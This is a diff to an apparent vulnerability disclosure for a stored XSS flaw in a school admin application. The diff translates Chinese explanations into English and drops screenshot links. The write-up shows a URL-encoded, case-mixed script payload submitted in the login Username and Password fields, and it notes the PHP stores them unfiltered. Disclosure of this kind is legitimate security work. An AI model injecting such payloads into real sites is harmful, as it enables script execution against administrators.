@@ -17,9 +17,8 @@ Connection: close
 Username=%5C%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&Password=%5C%22%3E%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&Level=1
 ```
 
-![1729591939852](./assets/1729591939852.png)
 
-访问[SMK TERPADU](http://ip/Admin/akun.php)触发xss
+Access http://ip/Admin/akun.php triggers XSS
 
 ```bash
 <?php
@@ -46,9 +45,7 @@ else
 ?>
 ```
 
-接受参数之后，没有进行任何过滤直接存入数据库
-
-![1729592170163](./assets/1729592170163.png)
+After the parameters are accepted, they are directly stored in the database without any filtering
 
 
 
